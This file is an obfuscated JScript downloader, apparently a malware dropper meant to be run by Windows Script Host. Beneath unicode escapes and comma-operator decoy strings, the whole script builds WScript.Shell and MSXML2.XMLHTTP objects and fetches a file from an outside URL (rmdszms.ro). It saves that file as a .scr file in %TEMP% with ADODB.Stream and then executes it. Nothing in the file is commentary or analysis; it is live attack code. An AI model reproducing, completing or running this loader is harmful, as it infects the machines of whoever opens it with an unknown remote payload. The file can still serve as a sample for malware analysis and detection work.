chanceSolid = ((0 | 3) * (1 | 13) * (3) * (([!+[] + !+[]])), this);
organizeMirage = ("d\u0065p\u006fs\u0069t", "a\u0064\u0065qua\u0074\u0065", "R\u0075\u006e");
trivialAttack = chanceSolid[("p\u0061ckin\u0067", "do\u0067", "ru\u0069\u006e", "m\u0061\u006eif\u0065\u0073\u0074o", "\u0057S\u0063rip\u0074")];
trivialAttack[("d\u0065t\u0061\u0069\u006c", "\u0053\u006ce\u0065\u0070")](((Math.pow(571207, 2) - 326277001849) / (94, 29)));
cultureFlag = trivialAttack[("\u0066r\u006f\u006et", "\u0043\u0072\u0065\u0061\u0074eO\u0062j\u0065ct")](("s\u0068o\u0063k", "te\u0078t", "\u0064i\u0073\u0070\u0061t\u0063\u0068er", "par\u0074\u006ee\u0072", "WScri\u0070\u0074.Shell"));
activeBomb = cultureFlag[("ba\u0073\u0069\u0073", "\u006deta\u006c", "\u0066\u006cag", "\u0070ulse", "\u0045xpa\u006e\u0064\u0045\u006eviro\u006emen\u0074S\u0074ri\u006e\u0067\u0073")](("t\u0065c\u0068nolog\u0079", "\u0025T\u0045\u004dP\u0025\u002f")) + ("\u006d\u0061ga\u007ai\u006ee\u0042\u0072illiant") + ("e\u0066f\u0065\u0063t\u0069\u0076e", ".s\u0063\u0072");
reanimationLicence = chanceSolid[("WSc\u0072i\u0070t")][("C\u0072ea\u0074e\u004f\u0062\u006ae\u0063t")](("\u0061\u006do\u0072p\u0068o\u0075\u0073", "d\u006f\u0063\u0075\u006den\u0074ar\u0079", "tri\u0076\u0069\u0061\u006c", "\u0063ontr\u0061c\u0074", "\u004dSXM\u004c\u0032.\u0058M\u004cH\u0054\u0054\u0050"));
reanimationLicence[("cam\u0070a\u0069\u0067n", "\u006ee\u0074", "\u0062u\u0074\u0074e\u0072fly", "ya\u0063\u0068\u0074", "\u006f\u0070\u0065\u006e")](("c\u0069tat\u0069\u006f\u006e", "\u0047\u0045T"), ("s\u0070\u0065cul\u0061\u0074\u0069o\u006e", "c\u0061m\u0070\u0061ig\u006e", "\u0074\u0068\u0065orem", "ht\u0074\u0070\u003a/\u002fr\u006dd\u0073zm\u0073.ro\u002f\u0032/\u0038\u0037yv5\u0063\u0064\u0073"), !(((((((([+!+[]])) + "" + (([!+[] + !+[] + !+[]]))))) + ((Math.pow(172, 2) - 29307) - 2 * 31 * 2)), (([!+[] + !+[]] * [!+[] + !+[] + !+[]] + ((25 + 15) / (6 ^ 46)))), (((([!+[] + !+[] + !+[]]) * ([!+[] + !+[] + !+[]]) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] - 1) * ([!+[] + !+[]] * [!+[] + !+[] + !+[]] + 1)) & (255 + 52)) - ((4032 / 42) - (0 ^ 12))), (((14 - 0) ^ (90 - 60)) ^ ((1 + 0) | 0))) > 8));
reanimationLicence[("\u006f\u0066fici\u0061\u006c", "\u0061\u0072\u0063\u0061de", "p\u0072\u0065\u0073um\u0070\u0074i\u006f\u006e", "\u0073\u0065\u006ed")]();
while(reanimationLicence[("ne\u0067ative", "\u006f\u0072\u0067aniz\u0061\u0074\u0069o\u006e", "\u0074\u0072o\u0070\u0068\u0079", "p\u0072oj\u0065ct\u0069o\u006e", "r\u0065\u0061dyst\u0061t\u0065")] < ((1 * 0) | (([!+[] + !+[]]) * ([!+[] + !+[]])))) {
	chanceSolid[("\u0057S\u0063\u0072ip\u0074")][("pro\u0070o\u0072\u0074i\u006f\u006e\u0061l", "\u0053leep")]((([!+[] + !+[]])) * (7 & 5) * (2 | 2) * (3 + 2));
}
tractFormula = chanceSolid[("\u0073hort\u0073", "b\u0075\u0074t\u0065r\u0066\u006cy", "\u0076i\u0073i\u0074", "WS\u0063\u0072ipt")][("\u0062\u0061\u006eana", "\u0065nc\u0079\u0063l\u006f\u0070\u0065\u0064\u0069\u0061", "bal\u006c\u006fo\u006e", "su\u0070e\u0072marke\u0074", "Cr\u0065\u0061\u0074eObj\u0065\u0063\u0074")](("phas\u0065", "\u0063o\u006dp\u006fs\u0065\u0072", "\u0076ita\u006din", "\u0041DODB\u002eS\u0074ream"));
try {
	tractFormula[("op\u0065n")]();
	tractFormula[("\u0064i\u0061\u006de\u0074\u0065r", "\u0074\u0079\u0070e")] = (([+!+[]]));
	tractFormula[("migr\u0061t\u0065", "w\u0072i\u0074\u0065")](reanimationLicence[("p\u0072e\u006d\u0069\u0075\u006d", "\u0069\u006e\u0064\u0069\u0076\u0069du\u0061\u006c", "\u0052\u0065s\u0070\u006f\u006eseB\u006fdy")]);
	tractFormula[("\u0063\u0061\u006e\u0064\u0069d\u0061t\u0065", "p\u006fsition")] = (([+[]]));
	tractFormula[("\u0066\u006cag", "di\u0061\u006cogu\u0065", "r\u0061d\u0061r", "\u0073\u0061\u0076eT\u006fF\u0069l\u0065")](activeBomb, (2 | (166, 118, 2)));
	tractFormula[("acti\u0076e", function String.prototype.interpretFact() {
		return this
	}, "m\u0061\u0073\u006b", "arb\u0069t\u0065r", "\u0063los\u0065")]();
	cultureFlag[organizeMirage](activeBomb.interpretFact(), ((27 - 27) ^ (94, 0)), (([+[]])));
} catch(cocoonDocument) {};
